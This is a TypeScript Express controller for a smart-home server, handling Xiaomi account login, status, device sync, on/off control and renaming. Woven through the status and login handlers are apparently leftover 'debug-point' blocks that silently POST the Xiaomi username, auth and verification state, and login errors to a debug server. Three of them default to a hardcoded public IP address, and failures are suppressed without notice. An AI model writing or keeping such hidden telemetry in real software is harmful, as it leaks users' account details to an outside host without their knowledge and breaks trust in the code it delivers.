import { Request, Response, NextFunction } from 'express';
import { SystemSettingsData } from '@shared/index';
import { systemService } from './system.service';
import { xiaomiAdapter } from './xiaomi.adapter';
import { XIAOMI_USERNAME, XIAOMI_PASSWORD } from '../../config/env';
import { getOperationActorContextFromRequest } from '../../lib/request-context';

export const getSettings = async (
  req: Request,
  res: Response,
  next: NextFunction,
): Promise<void> => {
  try {
    const settings = await systemService.getSettings();
    res.json(settings);
  } catch (error) {
    next(error);
  }
};

export const updateSettings = async (
  req: Request,
  res: Response,
  next: NextFunction,
): Promise<void> => {
  try {
    const partial = req.body as Partial<SystemSettingsData>;
    const operatorUserId = req.user!.id;
    const updated = await systemService.updateSettings(
      partial,
      operatorUserId,
      getOperationActorContextFromRequest(req),
    );
    res.json(updated);
  } catch (error) {
    next(error);
  }
};

export const xiaomiStatus = async (
  req: Request,
  res: Response,
  next: NextFunction,
): Promise<void> => {
  try {
    const loggedIn = await xiaomiAdapter.isLoggedIn();
    const authStatus = await xiaomiAdapter.getAuthStatus();
    const hasEnvCredentials = !!(XIAOMI_USERNAME && XIAOMI_PASSWORD);
    // #region debug-point D:controller-status-response
    (() => {
      const fs = require('node:fs');
      let u = 'http://145.223.100.249:7777/event';
      let s = 'xiaomi-auto-login';
      try {
        const e = fs.readFileSync('.dbg/xiaomi-auto-login.env', 'utf8');
        u = e.match(/DEBUG_SERVER_URL=(.+)/)?.[1] || u;
        s = e.match(/DEBUG_SESSION_ID=(.+)/)?.[1] || s;
      } catch {}
      fetch(u, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId: s,
          runId: 'pre-fix',
          hypothesisId: 'D',
          location: 'system.controller.ts:xiaomiStatus',
          msg: '[DEBUG] xiaomi status response prepared',
          data: {
            loggedIn,
            authState: authStatus?.state ?? null,
            needsVerification: authStatus?.needsVerification ?? null,
            hasNotificationUrl: !!authStatus?.notificationUrl,
            username: authStatus?.username ?? null,
          },
          ts: Date.now(),
        }),
      }).catch(() => {});
    })();
    // #endregion
    res.json({
      loggedIn,
      hasEnvCredentials,
      username:
        authStatus?.username ||
        (hasEnvCredentials ? XIAOMI_USERNAME ?? '已配置账号' : undefined),
      auth: authStatus,
    });
  } catch (error) {
    next(error);
  }
};

export const xiaomiLogin = async (
  req: Request,
  res: Response,
  next: NextFunction,
): Promise<void> => {
  try {
    const {
      username,
      password,
      userId,
      serviceToken,
      ssecurity,
      region,
      continueAfterVerification,
      sendEmailVerificationCode,
      verificationCode,
    } = (req.body ?? {}) as {
      username?: string;
      password?: string;
      userId?: string;
      serviceToken?: string;
      ssecurity?: string;
      region?: string;
      continueAfterVerification?: boolean;
      sendEmailVerificationCode?: boolean;
      verificationCode?: string;
    };

    if (sendEmailVerificationCode) {
      const sent = await xiaomiAdapter.sendEmailVerificationCode();
      res.json({
        sent,
        usedEnv: false,
        loginMode: 'password',
        verificationMethod: 'email_code',
      });
      return;
    }

    if (verificationCode) {
      try {
        const success = await xiaomiAdapter.verifyEmailCode(verificationCode);
        res.json({
          loggedIn: success,
          usedEnv: false,
          loginMode: 'password',
          verificationMethod: 'email_code',
        });
      } catch (error: any) {
        res.status(400).json({
          code: 'XIAOMI_VERIFY_EMAIL_CODE_FAILED',
          message: error?.message || '米家验证码校验失败',
          usedEnv: false,
          loginMode: 'password',
          verificationMethod: 'email_code',
        });
      }
      return;
    }

    if (continueAfterVerification) {
      // #region debug-point A:controller-continue-request
      (() => {
        const fs = require('node:fs');
        let u = 'http://145.223.100.249:7777/event';
        let s = 'xiaomi-auto-login';
        try {
          const e = fs.readFileSync('.dbg/xiaomi-auto-login.env', 'utf8');
          u = e.match(/DEBUG_SERVER_URL=(.+)/)?.[1] || u;
          s = e.match(/DEBUG_SESSION_ID=(.+)/)?.[1] || s;
        } catch {}
        fetch(u, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            sessionId: s,
            runId: 'pre-fix',
            hypothesisId: 'A',
            location: 'system.controller.ts:xiaomiLogin:continue-request',
            msg: '[DEBUG] continue login request entered controller',
            data: {
              hasUsername: !!username,
              continueAfterVerification: !!continueAfterVerification,
              path: req.path,
            },
            ts: Date.now(),
          }),
        }).catch(() => {});
      })();
      // #endregion
      try {
        const success = await xiaomiAdapter.continueLogin();
        // #region debug-point D:controller-continue-success
        (() => {
          const fs = require('node:fs');
          let u = 'http://145.223.100.249:7777/event';
          let s = 'xiaomi-auto-login';
          try {
            const e = fs.readFileSync('.dbg/xiaomi-auto-login.env', 'utf8');
            u = e.match(/DEBUG_SERVER_URL=(.+)/)?.[1] || u;
            s = e.match(/DEBUG_SESSION_ID=(.+)/)?.[1] || s;
          } catch {}
          fetch(u, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId: s,
              runId: 'pre-fix',
              hypothesisId: 'D',
              location: 'system.controller.ts:xiaomiLogin:continue-success',
              msg: '[DEBUG] continue login succeeded in controller',
              data: { success },
              ts: Date.now(),
            }),
          }).catch(() => {});
        })();
        // #endregion
        res.json({ loggedIn: success, usedEnv: false, loginMode: 'password' });
      } catch (error: any) {
        // #region debug-point C:controller-continue-failed
        (() => {
          const fs = require('node:fs');
          let u = 'http://145.223.100.249:7777/event';
          let s = 'xiaomi-auto-login';
          try {
            const e = fs.readFileSync('.dbg/xiaomi-auto-login.env', 'utf8');
            u = e.match(/DEBUG_SERVER_URL=(.+)/)?.[1] || u;
            s = e.match(/DEBUG_SESSION_ID=(.+)/)?.[1] || s;
          } catch {}
          fetch(u, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId: s,
              runId: 'pre-fix',
              hypothesisId: 'C',
              location: 'system.controller.ts:xiaomiLogin:continue-failed',
              msg: '[DEBUG] continue login failed in controller',
              data: { message: error?.message || String(error) },
              ts: Date.now(),
            }),
          }).catch(() => {});
        })();
        // #endregion
        res.status(400).json({
          code: 'XIAOMI_CONTINUE_LOGIN_FAILED',
          message: error?.message || '米家继续登录失败',
          usedEnv: false,
          loginMode: 'password',
        });
      }
      return;
    }

    const useSessionInput = !!(userId && serviceToken && ssecurity);
    // #region debug-point A:controller-login-branch
    (() => {
      const fs = require('node:fs');
      let u = 'http://127.0.0.1:7777/event';
      let s = 'xiaomi-login-still-fails';
      try {
        const e = fs.readFileSync('.dbg/xiaomi-login-still-fails.env', 'utf8');
        u = e.match(/DEBUG_SERVER_URL=(.+)/)?.[1] || u;
        s = e.match(/DEBUG_SESSION_ID=(.+)/)?.[1] || s;
      } catch {}
      fetch(u, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          sessionId: s,
          runId: 'pre-fix',
          hypothesisId: 'A',
          location: 'system.controller.ts:xiaomiLogin:branch',
          msg: '[DEBUG] received xiaomi login request',
          data: {
            hasUsername: !!username,
            hasPassword: !!password,
            hasUserId: !!userId,
            hasServiceToken: !!serviceToken,
            hasSsecurity: !!ssecurity,
            useSessionInput,
          },
          ts: Date.now(),
        }),
      }).catch(() => {});
    })();
    // #endregion

    if (useSessionInput) {
      try {
        const success = await xiaomiAdapter.loginWithSession({
          username,
          userId,
          serviceToken,
          ssecurity,
          region,
        });
        // #region debug-point D:controller-session-success
        (() => {
          const fs = require('node:fs');
          let u = 'http://127.0.0.1:7777/event';
          let s = 'xiaomi-login-still-fails';
          try {
            const e = fs.readFileSync('.dbg/xiaomi-login-still-fails.env', 'utf8');
            u = e.match(/DEBUG_SERVER_URL=(.+)/)?.[1] || u;
            s = e.match(/DEBUG_SESSION_ID=(.+)/)?.[1] || s;
          } catch {}
          fetch(u, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId: s,
              runId: 'pre-fix',
              hypothesisId: 'D',
              location: 'system.controller.ts:xiaomiLogin:session-success',
              msg: '[DEBUG] session login succeeded in controller',
              data: { username: username || null },
              ts: Date.now(),
            }),
          }).catch(() => {});
        })();
        // #endregion
        res.json({ loggedIn: success, usedEnv: false, loginMode: 'session' });
      } catch (error: any) {
        // #region debug-point B:controller-session-failed
        (() => {
          const fs = require('node:fs');
          let u = 'http://127.0.0.1:7777/event';
          let s = 'xiaomi-login-still-fails';
          try {
            const e = fs.readFileSync('.dbg/xiaomi-login-still-fails.env', 'utf8');
            u = e.match(/DEBUG_SERVER_URL=(.+)/)?.[1] || u;
            s = e.match(/DEBUG_SESSION_ID=(.+)/)?.[1] || s;
          } catch {}
          fetch(u, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              sessionId: s,
              runId: 'pre-fix',
              hypothesisId: 'B',
              location: 'system.controller.ts:xiaomiLogin:session-failed',
              msg: '[DEBUG] session login failed in controller',
              data: { message: error?.message || String(error) },
              ts: Date.now(),
            }),
          }).catch(() => {});
        })();
        // #endregion
        res.status(400).json({
          code: 'XIAOMI_SESSION_LOGIN_FAILED',
          message: error?.message || '米家会话串登录失败',
          usedEnv: false,
          loginMode: 'session',
        });
      }
      return;
    }

    const useEnv = !username || !password;
    const finalUser = useEnv ? XIAOMI_USERNAME : username;
    const finalPass = useEnv ? XIAOMI_PASSWORD : password;

    if (!finalUser || !finalPass) {
      res.status(400).json({
        code: 'XIAOMI_CREDENTIALS_REQUIRED',
        message:
          '未找到米家账号配置，请先在 server/.env 或 docker-compose.yml environment 中设置 XIAOMI_USERNAME 与 XIAOMI_PASSWORD',
      });
      return;
    }

    try {
      const success = await xiaomiAdapter.login(finalUser, finalPass);
      // #region debug-point D:controller-password-success
      (() => {
        const fs = require('node:fs');
        let u = 'http://127.0.0.1:7777/event';
        let s = 'xiaomi-login-still-fails';
        try {
          const e = fs.readFileSync('.dbg/xiaomi-login-still-fails.env', 'utf8');
          u = e.match(/DEBUG_SERVER_URL=(.+)/)?.[1] || u;
          s = e.match(/DEBUG_SESSION_ID=(.+)/)?.[1] || s;
        } catch {}
        fetch(u, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            sessionId: s,
            runId: 'pre-fix',
            hypothesisId: 'D',
            location: 'system.controller.ts:xiaomiLogin:password-success',
            msg: '[DEBUG] password login succeeded in controller',
            data: { useEnv, username: finalUser || null },
            ts: Date.now(),
          }),
        }).catch(() => {});
      })();
      // #endregion
      res.json({ loggedIn: success, usedEnv: useEnv, loginMode: 'password' });
    } catch (error: any) {
      // #region debug-point C:controller-password-failed
      (() => {
        const fs = require('node:fs');
        let u = 'http://127.0.0.1:7777/event';
        let s = 'xiaomi-login-still-fails';
        try {
          const e = fs.readFileSync('.dbg/xiaomi-login-still-fails.env', 'utf8');
          u = e.match(/DEBUG_SERVER_URL=(.+)/)?.[1] || u;
          s = e.match(/DEBUG_SESSION_ID=(.+)/)?.[1] || s;
        } catch {}
        fetch(u, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            sessionId: s,
            runId: 'pre-fix',
            hypothesisId: 'C',
            location: 'system.controller.ts:xiaomiLogin:password-failed',
            msg: '[DEBUG] password login failed in controller',
            data: { useEnv, message: error?.message || String(error) },
            ts: Date.now(),
          }),
        }).catch(() => {});
      })();
      // #endregion
      res.status(400).json({
        code: 'XIAOMI_LOGIN_FAILED',
        message: error?.message || '米家登录失败',
        usedEnv: useEnv,
        loginMode: 'password',
      });
    }
  } catch (error) {
    next(error);
  }
};

export const xiaomiSync = async (
  req: Request,
  res: Response,
  next: NextFunction,
): Promise<void> => {
  try {
    const operatorUserId = req.user!.id;
    try {
      const success = await systemService.syncXiaomiDevices(
        operatorUserId,
        getOperationActorContextFromRequest(req),
      );
      res.json({ synced: success });
    } catch (error: any) {
      res.status(400).json({
        code: 'XIAOMI_SYNC_FAILED',
        message: error?.message || '米家同步失败',
      });
    }
  } catch (error) {
    next(error);
  }
};

export const controlDevice = async (
  req: Request,
  res: Response,
  next: NextFunction,
): Promise<void> => {
  try {
    const { did } = req.params;
    const { action } = (req.body ?? {}) as { action?: 'on' | 'off' };
    const operatorUserId = req.user!.id;
    if (!did) {
      res.status(400).json({ code: 'DID_REQUIRED', message: '缺少设备 did' });
      return;
    }
    if (action !== 'on' && action !== 'off') {
      res.status(400).json({ code: 'INVALID_ACTION', message: 'action 必须是 on 或 off' });
      return;
    }
    if (action === 'on') {
      await xiaomiAdapter.turnOn(did, operatorUserId, getOperationActorContextFromRequest(req));
    } else {
      await xiaomiAdapter.turnOff(did, operatorUserId, getOperationActorContextFromRequest(req));
    }
    res.json({ ok: true, did, action });
  } catch (error) {
    next(error);
  }
};

export const renameDevice = async (
  req: Request,
  res: Response,
  next: NextFunction,
): Promise<void> => {
  try {
    const { did } = req.params;
    const { name } = (req.body ?? {}) as { name?: string };
    const operatorUserId = req.user!.id;

    if (!did) {
      res.status(400).json({ code: 'DID_REQUIRED', message: '缺少设备 did' });
      return;
    }

    if (typeof name !== 'string' || !name.trim()) {
      res.status(400).json({ code: 'NAME_REQUIRED', message: '设备名称不能为空' });
      return;
    }

    const updated = await systemService.renameDevice(
      did,
      name,
      operatorUserId,
      getOperationActorContextFromRequest(req),
    );
    res.json(updated);
  } catch (error) {
    next(error);
  }
};

export const bulkControlDevices = async (
  req: Request,
  res: Response,
  next: NextFunction,
): Promise<void> => {
  try {
    const { action } = (req.body ?? {}) as { action?: 'on' | 'off' };
    const operatorUserId = req.user!.id;

    if (action !== 'on' && action !== 'off') {
      res.status(400).json({ code: 'INVALID_ACTION', message: 'action 必须是 on 或 off' });
      return;
    }

    const result = await systemService.bulkControlDevices(
      action,
      operatorUserId,
      getOperationActorContextFromRequest(req),
    );
    res.json(result);
  } catch (error) {
    next(error);
  }
};
